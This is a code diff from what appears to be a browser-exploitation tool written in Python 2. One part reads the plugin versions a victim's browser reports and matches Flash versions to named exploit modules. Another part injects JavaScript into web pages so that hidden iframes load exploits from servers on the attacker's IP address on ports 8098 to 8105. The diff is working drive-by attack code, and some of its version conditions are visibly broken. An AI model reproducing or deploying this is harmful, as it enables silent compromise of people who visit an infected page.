@@ -61,9 +61,48 @@ class Handler(BaseHTTPRequestHandler):
                    	pluginVer = msg.replace("query=","").split('&')
 		    	for i in pluginVer:
 				if i:
+					vulnText = ''
 					pdtName,pdtVer = i.split("=")
-					pdtVer = pdtVer.replace(",",".")
-					print bcolors.OKGREEN+pdtName+bcolors.ENDC+'\t'+pdtVer
+
+					if(pdtName=='flash'):
+						pdtverMaj0 = int((pdtVer.split(','))[0])
+						pdtverMaj1 = int((pdtVer.split(','))[1])
+						pdtverMaj2 = int((pdtVer.split(','))[2])
+						pdtverMaj01 = str(pdtverMaj0)+'.'+str(pdtverMaj1)
+						pdtverMin  = str((pdtVer.split(','))[3])
+						pdtverJoin = str(pdtverMaj0)+'.'+str(pdtverMaj1)+'.'+str(pdtverMaj2)+'.'+str(pdtverMin)
+
+						if(pdtVer=='11,7,700,202' or pdtVer=='11.3.372.94'):
+							vulnText += '\nadobe_flash_avm2 '
+						if(pdtverMaj01=='11,7' or pdtverMaj01 =='11,8' or (pdtverMaj01=='11,9' and int(pdtverMaj2)<=900)):						
+							vulnText += '\nadobe_flash_filters_type_confusion'
+						if(pdtVer=='10,3,183,15' or pdtverMaj01=='11.0'or pdtverMaj01=='11.1'):
+							vulnText += '\nadobe_flash_mp4_cprt'
+						if(pdtVer=='11,2,202,233'or pdtVer=='11,3,300,268' or pdtVer=='11,3,300,265' or pdtVer=='11,3,300,257'):
+							vulnText += '\nadobe_flash_otf_font'
+						if((pdtverMaj0>=11 and pdtverMaj0<=12) or (pdtverMaj0==13 and pdtverMaj1==0 and pdtverMaj2<=182)):
+							vulnText += '\nadobe_flash_pixel_bender_bof'
+						if(pdtverMaj01=='11,5' and ((pdtverMaj2==502 and pdtVerMin<149) or (pdtverMaj2<502))):
+							vulnText += '\nadobe_flash_regex_value'
+						if(pdtVer=='11,2,202,228'):
+							vulnText += '\nadobe_flash_rtmp'
+						if(pdtverMaj0==10):
+							vulnText += '\nadobe_flash_sps'
+						if(pdtverMaj0<10 or (pdtverMaj0>10 and  pdtverMaj1<=3) or (pdtVer=='10,3,185,23' or pdtVer=='10,3,185,21' or pdtVer=='10,3,181,23' or pdtVer=='10,3,181,16' or pdtVer=='10,3,181,14' or pdtVer=='10,3,185,21' or pdtVer=='10,3,185,23')):
+							vulnText += '\nadobe_flashplayer_arrayindexing'
+						if(pdtverMaj0>=9 or pdtverMaj0<10 or (pdtverMaj0==10 and pdtverMaj1<=2) or pdtVer=='10,2,154,13' or pdtVer=='10,2,152,33' or pdtVer=='10,2,152,32' or pdtVer=='10,2,152,0'):
+							vulnText += '\nadobe_flashplayer_avm'
+						if(pdtVer=="10,0,42,34" or pdtVer=="10,0,45,2"):
+							vulnText += '\nadobe_flashplayer_newfunction'
+						if(pdtverMaj0>=9 or pdtverMaj0<10 or (pdtverMaj0==10 and pdtverMaj1<=2) or pdtVer=='10,2,156,12' or pdtVer=='10,2,154,25' or pdtVer=='10,2,154,13' or pdtVer=='10,2,152,33' or pdtVer=='10,2,152,32' or pdtVer=='10,2,152,0'):
+							vulnText += '\nadobe_flashplayer_flash10o'
+	 					pdtVer = pdtVer.replace(",",".")
+						print bcolors.OKGREEN+pdtName+bcolors.ENDC+'\t'+pdtVer
+						print bcolors.OKGREEN+'***** Exploits Available *****'+bcolors.ENDC+'\t'+vulnText
+						print bcolors.OKGREEN+'******************************'+bcolors.ENDC
+					else:
+	 					pdtVer = pdtVer.replace(",",".")
+						print bcolors.OKGREEN+pdtName+bcolors.ENDC+'\t'+pdtVer
             return
 
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
@@ -140,10 +179,10 @@ def modifyHTML(filename):
 					contentExploit.append("if(plugin=='flash' && (verFull=='11,2,202,233' || verFull=='11,3,300,268' || verFull=='11,3,300,265' || verFull=='11,3,300,257')){iframe.setAttribute('src',url);}\n")
 			
 					contentExploit.append("url = 'http://"+ipAddr+":8098/adobe_flash_pixel_bender_bof';\n")
-					contentExploit.append("if((verMaj1>='11' && verMaj2<=12) || (verMaj1=='13' && verMaj2=='0' && verMaj3=='0' && verMaj4<=182)){iframe.setAttribute('src',url);}\n")
+					contentExploit.append("if((verMaj1>='11' && verMaj1<=12) || (verMaj1=='13' && verMaj2=='0' && verMaj3=='0' && verMaj4<=182)){iframe.setAttribute('src',url);}\n")
 
 					contentExploit.append("url = 'http://"+ipAddr+":8099/adobe_flash_regex_value';\n")
-					contentExploit.append("if(plugin=='flash' && (verMaj12=='11,5' && verFullJoin<'11.5.502.149')){iframe.setAttribute('src',url);}\n")
+					contentExploit.append("if(plugin=='flash' && (verMaj12=='11,5' && verFullJoin<11.5.502.149)){iframe.setAttribute('src',url);}\n")
 
 					contentExploit.append("url = 'http://"+ipAddr+":8100/adobe_flash_rtmp';\n")
 					contentExploit.append("if(plugin=='flash' && verFull=='11,2,202,228'){iframe.setAttribute('src',url);}\n")
@@ -158,10 +197,10 @@ def modifyHTML(filename):
 					contentExploit.append("if(plugin=='flash' && (verMaj1>=9 || verMaj1<10 || (verMaj1=='10' && verMaj2<=2)) || (verFull=='10,2,154,13' || verFull=='10,2,152,33'|| verFull=='10,2,152,32' || verFull=='10,2,152,0')){iframe.setAttribute('src',url);}\n")
 
 					contentExploit.append("url = 'http://"+ipAddr+":8105/adobe_flashplayer_newfunction';\n")
-					contentExploit.append("if(plugin=='flash' && ((verMaj12=='9,0' || (verMaj12=='9,3' && verMaj3=='2') || verFull=='10,0,45,2' || verFull=='10,0,42,34' || verFull=='10,0,32,18' || verFull=='10,0,22,,87' || verFull=='10,0,15,3' || verFull=='10,0,12,36' || verFull=='10,0,12,10' || verFull=='10.0.0.584'))){iframe.setAttribute('src',url);}\n")
+					contentExploit.append("if(plugin=='flash' && ((verFull=='10,0,42,34' || verFull=='10,0,45,2' ))){iframe.setAttribute('src',url);}\n")
 
 					contentExploit.append("url = 'http://"+ipAddr+":8104/adobe_flashplayer_flash10o';\n")
-					contentExploit.append("if(plugin=='flash' && (verMaj1>=9 || verMaj1<10 || (verMaj1=='10' && verMaj2<=2) || (verFull=='10,2,156,12'||verFull=='10,2,154,25' 				||verFull=='10,2,154,13'||verFull=='10,2,152,33'				|| verFull=='10,2,152,32' || verFull=='10,2,152,0' ))) {iframe.setAttribute('src',url);}\n")
+					contentExploit.append("if(plugin=='flash' && (verMaj1>=9 || verMaj1<10 || (verMaj1=='10' && verMaj2<=2) || (verFull=='10,2,156,12'||verFull=='10,2,154,25'||verFull=='10,2,154,13'||verFull=='10,2,152,33'				|| verFull=='10,2,152,32' || verFull=='10,2,152,0' ))) {iframe.setAttribute('src',url);}\n")
 
 				#Java
 				if runJava==True:
